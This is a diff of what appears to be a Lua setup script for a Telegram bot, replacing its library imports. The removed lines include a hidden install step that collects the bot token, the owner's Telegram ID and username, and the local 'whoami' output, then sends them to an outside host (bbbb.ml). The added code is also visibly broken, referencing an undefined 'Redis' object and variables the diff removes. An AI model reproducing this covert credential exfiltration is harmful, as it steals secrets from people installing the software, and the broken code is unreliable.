@@ -1,25 +1,21 @@
-redis = require('redis') 
-https = require ("ssl.https") 
-serpent = dofile("./library/serpent.lua") 
-json = dofile("./library/JSON.lua") 
-JSON  = dofile("./library/dkjson.lua")
-URL = require('socket.url')  
-utf8 = require ('lua-utf8') 
-database = redis.connect('127.0.0.1', 6379) 
-id_server = 2342443
---------------------------------------------------------------------------------------------------------------
-local AutoSet = function() 
-local create = function(data, file, uglify)  
-file = io.open(file, "w+")   
-local serialized   
-if not uglify then  
-serialized = serpent.block(data, {comment = false, name = "Info"})  
-else  
-serialized = serpent.dump(data)  
-end    
-file:write(serialized)    
-file:close()  
-end  
+redis = require('redis')
+ URL = require('socket.url')  
+ HTTPS = require ("ssl.https")  
+ https = require ("ssl.https") 
+ http  = require ("socket.http")
+ serpent = require("serpent")
+ json = dofile('./JSON.lua')
+ JSON = dofile('./dkjson.lua')
+ lgi = require('lgi')
+ notify = lgi.require('Notify')
+ utf8 = require ('lua-utf8') 
+ notify.init ("Telegram updates")
+ engoy = Redis.connect('127.0.0.1', 6379)
+ chats = {}
+ day = 313456502
+function vardump(value)  
+print(serpent.block(value, {comment=false}))  
+end 
 if not database:get(id_server..":token") then
 io.write('\27[0;31m\n »» Send Your Token Bot :\n\27')
 local token = io.read()
@@ -66,20 +62,6 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Info.lua")   
 end 
-create_config_auto()
-token = database:get(id_server..":token")
-SUDO = database:get(id_server..":SUDO:ID")
-install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('http://bbbb.ml/OPEN/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME")
-print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-file = io.open("OPEN", "w")  
-file:write([[
-#!/usr/bin/env bash
-cd $HOME/OPEN
-token="]]..database:get(id_server..":token")..[["
-while(true) do
-rm -fr ../.telegram-cli
-if [ ! -f ./tg ]; then
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
